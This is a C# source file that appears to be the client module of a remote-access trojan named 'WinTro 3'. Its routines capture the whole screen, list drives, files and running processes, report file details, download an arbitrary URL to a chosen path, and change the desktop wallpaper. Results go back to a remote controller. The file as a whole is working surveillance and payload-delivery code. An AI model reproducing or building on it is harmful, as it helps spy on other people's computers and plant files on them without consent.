using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace WinTro_3_Client;

internal class LongCommands
{
	public static class ScreenCapture
	{
		private static class GDI32
		{
			public const int SRCCOPY = 13369376;

			[DllImport("gdi32.dll")]
			public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop);

			[DllImport("gdi32.dll")]
			public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth, int nHeight);

			[DllImport("gdi32.dll")]
			public static extern IntPtr CreateCompatibleDC(IntPtr hDC);

			[DllImport("gdi32.dll")]
			public static extern bool DeleteDC(IntPtr hDC);

			[DllImport("gdi32.dll")]
			public static extern bool DeleteObject(IntPtr hObject);

			[DllImport("gdi32.dll")]
			public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);
		}

		private static class User32
		{
			public struct RECT
			{
				public int left;

				public int top;

				public int right;

				public int bottom;
			}

			[DllImport("user32.dll")]
			public static extern IntPtr GetDesktopWindow();

			[DllImport("user32.dll")]
			public static extern IntPtr GetWindowDC(IntPtr hWnd);

			[DllImport("user32.dll")]
			public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);

			[DllImport("user32.dll")]
			public static extern IntPtr GetWindowRect(IntPtr hWnd, ref RECT rect);
		}

		public static Image CaptureScreen()
		{
			return CaptureWindow(User32.GetDesktopWindow());
		}

		public static Image CaptureWindow(IntPtr handle)
		{
			IntPtr windowDC = User32.GetWindowDC(handle);
			User32.RECT rect = default(User32.RECT);
			User32.GetWindowRect(handle, ref rect);
			int nWidth = rect.right - rect.left;
			int nHeight = rect.bottom - rect.top;
			IntPtr intPtr = GDI32.CreateCompatibleDC(windowDC);
			IntPtr intPtr2 = GDI32.CreateCompatibleBitmap(windowDC, nWidth, nHeight);
			IntPtr hObject = GDI32.SelectObject(intPtr, intPtr2);
			GDI32.BitBlt(intPtr, 0, 0, nWidth, nHeight, windowDC, 0, 0, 13369376);
			GDI32.SelectObject(intPtr, hObject);
			GDI32.DeleteDC(intPtr);
			User32.ReleaseDC(handle, windowDC);
			Image result = (Image)(object)Image.FromHbitmap(intPtr2);
			GDI32.DeleteObject(intPtr2);
			return result;
		}

		public static void CaptureWindowToFile(IntPtr handle, string filename, ImageFormat format)
		{
			Image val = CaptureWindow(handle);
			val.Save(filename, format);
		}

		public static void CaptureScreenToFile(string filename, ImageFormat format)
		{
			Image val = CaptureScreen();
			val.Save(filename, format);
		}
	}

	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	private const int SPIF_SENDWININICHANGE = 2;

	public static Client Client;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	public LongCommands(Client client)
	{
		Client = client;
	}

	public static string GetFileListAt(string path, bool showCompleteDrivesNames)
	{
		try
		{
			string text;
			if (path == "")
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				text = "";
				if (showCompleteDrivesNames)
				{
					DriveInfo[] array = drives;
					foreach (DriveInfo driveInfo in array)
					{
						try
						{
							object obj = text;
							text = string.Concat(obj, driveInfo.VolumeLabel, " (", driveInfo.RootDirectory, ")\r\n");
						}
						catch (Exception ex)
						{
							object obj = text;
							text = string.Concat(obj, ex.Message.Remove(ex.Message.Length - 3, 3), " (", driveInfo.RootDirectory, ")\r\n");
						}
					}
				}
				else
				{
					DriveInfo[] array = drives;
					foreach (DriveInfo driveInfo in array)
					{
						text = string.Concat(text, driveInfo.RootDirectory, "\r\n");
					}
				}
				return "viewfilelist|" + text;
			}
			string[] directories = Directory.GetDirectories(path, "*", SearchOption.TopDirectoryOnly);
			string[] files = Directory.GetFiles(path, "*", SearchOption.TopDirectoryOnly);
			text = "";
			string[] array2 = directories;
			foreach (string text2 in array2)
			{
				text = text + text2 + "\\\r\n";
			}
			array2 = files;
			foreach (string text3 in array2)
			{
				text = text + text3 + "\r\n";
			}
			return "viewfilelist|" + text;
		}
		catch (Exception)
		{
			return "ERROR";
		}
	}

	public static string GetFileInfo(string file)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(file);
			return string.Concat("File: ", file, "\r\n\r\n\r\nDimensioni: ", fileInfo.Length, " B\r\nDimensioni: ", fileInfo.Length / 1024L, " kB\r\nDimensioni: ", fileInfo.Length / 1048576L, " MB\r\n\r\nData creazione: ", fileInfo.CreationTime, "\r\nData ultimo accesso: ", fileInfo.LastAccessTime, "\r\nData ultima modifica: ", fileInfo.LastWriteTime);
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	public static string GetProcessesList()
	{
		string text = Client.Name + "'s Processes list:\r\n";
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				object obj = text;
				text = string.Concat(obj, "'", process.MainWindowTitle, "'\t\t'", process.ProcessName, "'\t\t'", process.WorkingSet64 / 1024L, "kB'\t\t'", process.MainModule!.FileName, "'\r\n");
			}
			catch (Exception)
			{
				try
				{
					object obj = text;
					text = string.Concat(obj, "'", process.MainWindowTitle, "'\t\t'", process.ProcessName, "'\t\t'", process.WorkingSet64 / 1024L, "kB'\r\n");
				}
				catch (Exception)
				{
					try
					{
						string text2 = text;
						text = text2 + "'" + process.MainWindowTitle + "'\t\t'" + process.ProcessName + "'\r\n";
						goto end_IL_0125;
					}
					catch (Exception)
					{
						text += "error\r\n";
						goto end_IL_0125;
					}
					end_IL_0125:;
				}
			}
		}
		return text;
	}

	public void DownloadFile(string URL, string SaveTo)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFileCompleted += DownloadCompleted;
		webClient.DownloadFileAsync(new Uri(URL), SaveTo);
		Client.Data.Send("Download started");
	}

	private void DownloadCompleted(object sender, AsyncCompletedEventArgs e)
	{
		Client.Data.Send("Download completed");
	}

	public void SetDesktopWallpaper(string file)
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\wallpaper.bmp";
		Image val = Image.FromFile(file);
		val.Save(text, ImageFormat.get_Bmp());
		SystemParametersInfo(20, 0, text, 3);
	}
}
